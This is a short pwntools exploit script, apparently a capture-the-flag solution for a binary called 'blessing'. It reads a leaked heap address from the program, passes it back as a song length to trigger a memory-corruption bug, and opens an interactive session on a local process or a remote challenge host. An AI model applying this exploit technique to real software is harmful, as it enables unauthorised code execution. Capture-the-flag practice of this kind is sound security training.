#!/usr/bin/env python3

from pwn import *

exe = ELF("./blessing_patched")
libc = ELF("./libc.so.6", False)
ld = ELF("./ld-linux-x86-64.so.2", False)

context.binary = exe
gdb_script = '''
b *main+55
b *main+278
c
'''

def conn():
    if args.LOCAL:
        r = process([exe.path]) 
        #gdb.attach(r, gdb_script)
    else:
        r = remote("94.237.55.15", 39639)

    return r


def main():
    r = conn()
    r.recvuntil(b"Please accept this: ")
    
    addr = r.recvn(14).decode()

    log.info(f"heap at {addr}")
    
    r.sendlineafter(b"Give me the song's length: ", str(int(addr, 16)).encode())
    r.sendlineafter(b"Excellent! Now tell me the song: ", b"1234")

    r.interactive()


if __name__ == "__main__":
    main()
